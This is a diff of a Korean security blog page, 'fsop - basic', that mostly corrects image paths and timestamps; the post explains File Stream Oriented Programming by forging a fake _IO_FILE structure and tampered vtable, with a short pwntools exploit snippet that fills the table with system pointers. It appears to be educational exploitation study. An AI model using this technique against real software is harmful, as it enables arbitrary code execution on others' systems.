@@ -17,15 +17,15 @@
 <meta property="og:site_name" content="귀찮다">
 <meta property="og:description" content="fsop - basic기본적인 fsop. fake _IO_FILE 구조체를 만들어 vtable의 조작된 함수 포인터가 실행되게 만들면 된다.">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="c:%5CUsers%5Cfnfnf%5CHACKING%5Cblog%5Cz2%5Csource%5Cimage/1572477456111.png">
-<meta property="og:image" content="c:%5CUsers%5Cfnfnf%5CHACKING%5Cblog%5Cz2%5Csource%5Cimage/1572477529414.png">
-<meta property="og:image" content="c:%5CUsers%5Cfnfnf%5CHACKING%5Cblog%5Cz2%5Csource%5Cimage/1572477627979.png">
-<meta property="og:image" content="c:%5CUsers%5Cfnfnf%5CHACKING%5Cblog%5Cz2%5Csource%5Cimage/1572487126356.png">
-<meta property="og:updated_time" content="2019-11-01T02:29:49.081Z">
+<meta property="og:image" content="c:%5CUsers%5Cfnfnf%5CHACKING%5Cblog%5Cz2%5Csource%5Cimage%5C1572477456111.png">
+<meta property="og:image" content="https://blog.haklog.xyz/2019/05/16/post-3/image/1572477529414.png">
+<meta property="og:image" content="https://blog.haklog.xyz/2019/05/16/post-3/image/1572477627979.png">
+<meta property="og:image" content="https://blog.haklog.xyz/2019/05/16/post-3/image/1572487126356.png">
+<meta property="og:updated_time" content="2019-11-01T05:01:47.597Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="fsop - basic">
 <meta name="twitter:description" content="fsop - basic기본적인 fsop. fake _IO_FILE 구조체를 만들어 vtable의 조작된 함수 포인터가 실행되게 만들면 된다.">
-<meta name="twitter:image" content="c:%5CUsers%5Cfnfnf%5CHACKING%5Cblog%5Cz2%5Csource%5Cimage/1572477456111.png">
+<meta name="twitter:image" content="c:%5CUsers%5Cfnfnf%5CHACKING%5Cblog%5Cz2%5Csource%5Cimage%5C1572477456111.png">
   
   
     <link rel="icon" href="/img/one.png">
@@ -298,18 +298,18 @@
 
 <p>fsop는 일반적으로 파일 스트림을 가키리는 포인터를 fake _io_file structure로 돌려 조작된 vtable의 함수 포인터가 실행되도록 만드는 기법이다. stdout을 덮는 방법도 있지만, 나중에 포스팅 하겠다.</p>
 <p>open</p>
-<p><img src="C:%5CUsers%5Cfnfnf%5CHACKING%5Cblog%5Cz2%5Csource%5Cimage/1572477456111.png" alt="1572477456111"></p>
+<p><img src="C:%5CUsers%5Cfnfnf%5CHACKING%5Cblog%5Cz2%5Csource%5Cimage%5C1572477456111.png" alt="1572477456111"></p>
 <p>내부구조를 보면 file structure에서 공부했던 내용 그대로 나와있다.</p>
 <blockquote>
 <p>fileno를 보면 앞서 공부한대로 파일 디스크립터가 3에 할당이 된 것을 알 수 있다. (0, 1, 2는 각각 stdin, stdout,stderr에 이미 할당이 되어있기에 그 다음 번호인 3에 할당이 된 것이다.)</p>
 </blockquote>
 <p>마지막 0x7ffff7dd06e0은 vtable의 주소이다. 0x6020f0은 널포인터지만 참조될 때 쓰이기 때문에 그대로 맞춰주어야 한다. 나머지는 더미값으로 채워넣으면 된다.</p>
-<p><img src="C:%5CUsers%5Cfnfnf%5CHACKING%5Cblog%5Cz2%5Csource%5Cimage/1572477529414.png" alt="1572477529414"></p>
-<p><img src="C:%5CUsers%5Cfnfnf%5CHACKING%5Cblog%5Cz2%5Csource%5Cimage/1572477627979.png" alt="1572477627979"></p>
+<p><img src="image/1572477529414.png" alt="1572477529414"></p>
+<p><img src="image/1572477627979.png" alt="1572477627979"></p>
 <p>exploit</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">stream = p64(<span class="number">0</span>)*<span class="number">17</span></span><br><span class="line">stream += p64(NULLPOINTER)</span><br><span class="line">stream += p64(<span class="number">0</span>)*<span class="number">9</span></span><br><span class="line">stream += p64(vtable)</span><br><span class="line">stream += p64(system)*<span class="number">20</span></span><br><span class="line"></span><br><span class="line">p.sendline(stream)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:%5CUsers%5Cfnfnf%5CHACKING%5Cblog%5Cz2%5Csource%5Cimage/1572487126356.png" alt="1572487126356"></p>
+<p><img src="image/1572487126356.png" alt="1572487126356"></p>
 
       
     </div>
@@ -321,7 +321,7 @@
         <p><span>제목:</span><a  href="/2019/05/16/post-3/">fsop - basic</a></p>
         <p><span>저자:</span><a  href="/" title="访问 K4el 的个人博客">K4el</a></p>
         <p><span>발행 시간:</span>2019년05월16일 - 22시56분</p>
-        <p><span>마지막 업데이트:</span>2019년11월01일 - 11시29분</p>
+        <p><span>마지막 업데이트:</span>2019년11월01일 - 14시01분</p>
     </div>
 
 
